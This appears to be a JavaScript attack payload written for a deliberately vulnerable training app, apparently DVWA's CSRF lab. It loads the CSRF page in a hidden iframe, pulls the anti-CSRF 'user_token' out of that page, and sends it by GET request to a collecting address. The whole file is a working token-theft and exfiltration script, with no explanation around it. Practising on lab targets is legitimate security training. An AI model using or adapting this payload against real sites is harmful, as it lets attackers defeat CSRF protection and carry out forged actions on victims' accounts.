var iframe = document.createElement('iframe');
iframe.src='http://12.0.3.12:60080/vulnerabilities/csrf/';
iframe.id='vul';
iframe.style.display="none"
document.body.appendChild(iframe);
window.onload=function(){
var xmlhttp=new XMLHttpRequest();
var token=document.getElementById('vul').contentWindow.document.getElementsByName("user_token")[0].value;
var url="http://127.0.0.1:80?t=".concat(token);
xmlhttp.open("GET",url,true);
xmlhttp.send();
}